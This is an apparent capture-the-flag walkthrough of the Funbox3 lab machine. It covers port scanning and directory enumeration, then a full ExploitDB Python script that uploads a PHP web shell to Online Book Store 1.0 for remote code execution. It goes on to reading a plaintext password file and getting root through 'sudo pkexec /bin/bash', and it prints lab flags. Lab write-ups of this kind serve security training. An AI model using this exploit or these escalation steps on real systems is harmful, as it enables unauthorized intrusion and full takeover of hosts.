---
custom_edit_url: null
---


## Reconnaissance

### Nmap scan

Let's perform an `nmap` scan to find the open ports and the services running on the open ports.

```
$ nmap -Pn -p- -A -T5 192.168.186.111
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 01:48 EDT
Warning: 192.168.186.111 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.186.111
Host is up (0.068s latency).
Not shown: 62830 closed tcp ports (conn-refused), 2702 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f (RSA)
|   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 (ECDSA)
|_  256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_gym
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=8/13%Time=66BAF50B%P=x86_64-pc-linux-gnu%
SF:r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTT
SF:POptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSV
SF:ersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTC
SF:P,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\
SF:0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\
SF:x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCoo
SF:kie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20messag
SF:e\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNe
SF:g,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05
SF:HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStri
SF:ng,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message
SF:\"\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOpti
SF:ons,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05
SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY
SF:000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\
SF:0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
SF:)%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message
SF:\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 345.55 seconds
```

There are three open ports:

| Port  | Service |
| ----- | ------- |
| 22    | ssh     |
| 80    | http    |
| 33060 | mysqlx  |

| Port  | Service |
| :---- | :------ |
| 22    | ssh     |
| 80    | http    |
| 33060 | mysqlx  |

### Port 80 (HTTP)

#### Directory enumeration

```
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.186.111:80/FUZZ 
________________________________________________

.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 72ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 92ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 1340ms]
admin                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 64ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 2343ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 66ms]
index.php               [Status: 200, Size: 3468, Words: 634, Lines: 80, Duration: 68ms]
robots.txt              [Status: 200, Size: 14, Words: 2, Lines: 2, Duration: 70ms]
secret                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 81ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 68ms]
store                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 73ms]
:: Progress: [4614/4614] :: Job [1/1] :: 623 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

#### `/store`

Let's visit the page through our browser.

![2](https://github.com/user-attachments/assets/67638f6c-9b38-41ad-9259-efd898d1d688)

&nbsp;

## Exploitation

### Searching for relevant exploit

On searching for exploits for "CSE bookstore", we can find [this](https://www.exploit-db.com/exploits/47887) exploit on ExploitDB.

![3](https://github.com/user-attachments/assets/9639e233-9160-408d-b0b6-c9f8962eed48)

```python title="47887.py"
# Exploit Title: Online Book Store 1.0 - Unauthenticated Remote Code Execution
# Google Dork: N/A
# Date: 2020-01-07
# Exploit Author: Tib3rius
# Vendor Homepage: https://projectworlds.in/free-projects/php-projects/online-book-store-project-in-php/
# Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/master.zip
# Version: 1.0
# Tested on: Ubuntu 16.04
# CVE: N/A

import argparse
import random
import requests
import string
import sys

parser = argparse.ArgumentParser()
parser.add_argument('url', action='store', help='The URL of the target.')
args = parser.parse_args()

url = args.url.rstrip('/')
random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))

payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'

file = {'image': (random_file + '.php', payload, 'text/php')}
print('> Attempting to upload PHP web shell...')
r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
print('> Verifying shell upload...')
r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)

if random_file in r.text:
    print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
    print('> Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
    launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
    if launch_shell.lower() == 'y':
        while True:
            cmd = str(input('RCE $ '))
            if cmd == 'exit':
                sys.exit(0)
            r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
            print(r.text)
else:
    if r.status_code == 200:
        print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
    else:
        print('> Web shell failed to upload! The web server may not have write permissions.')
```

### Obtaining shell through RCE

We can run the exploit using the following command:

```
$ python 47887.py http://192.168.186.111/store/
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://192.168.186.111/store/bootstrap/img/lx1opTmceh.php
> Example command usage: http://192.168.186.111/store/bootstrap/img/lx1opTmceh.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ 
```

&nbsp;

## Post Exploitation

### local.txt

```
RCE $ find / "local.txt" 2>/dev/null | grep "local.txt"
/usr/share/doc/cloud-init/examples/upstart-rclocal.txt
/var/www/local.txt
```

```
RCE $ cat /var/www/local.txt
492ecde3acd7b1eea3d5ed4ca72b2805
```

### User enumeration

```
RCE $ ls /home
tony
```

There is a user `tony` on the target machine.

| Username |
| -------- |
| tony     |

Let's check if there is anything useful in the home directory.

```
RCE $ ls -la /home/tony
total 24
drwxr-xr-x 2 tony tony 4096 Oct 30  2020 .
drwxr-xr-x 3 root root 4096 Jul 30  2020 ..
-rw------- 1 tony tony    0 Oct 30  2020 .bash_history
-rw-r--r-- 1 tony tony  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 tony tony 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 tony tony  807 Feb 25  2020 .profile
-rw-rw-r-- 1 tony tony   70 Jul 31  2020 password.txt
```

We can cat out the `password.txt` file.

```
RCE $ cat /home/tony/password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
```

Looks like the password for the `tony` user is `yxcvbnmYYY`.

#### Logging in as the `tony` user

```
$ ssh tony@192.168.186.111
tony@192.168.186.111's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug 13 07:15:11 UTC 2024

  System load:  0.0               Processes:               154
  Usage of /:   76.0% of 4.66GB   Users logged in:         0
  Memory usage: 58%               IPv4 address for ens256: 192.168.186.111
  Swap usage:   0%


60 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 13 07:15:03 2024 from 192.168.45.193
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tony@funbox3:~$ 
```


### Privilege Escalation

#### Misconfigured Sudo privileges

Let's check what commands `tony` can run with `root` privileges without needing a password.

```
tony@funbox3:~$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
```

We can use this misconfigured SUID bit to escalate our privileges.

We can find the this payload on [GTFOBins](https://gtfobins.github.io/gtfobins/pkexec/#sudo).

![4](https://github.com/user-attachments/assets/605f39e5-87fd-4e73-92c8-b19e6a430553)

```
tony@funbox3:~$ sudo pkexec /bin/bash
root@funbox3:~# whoami
root
```

### proof.txt

```
root@funbox3:~# cat /root/proof.txt
ba6a70ed34367bbc540fe8cbef18b4e4
```
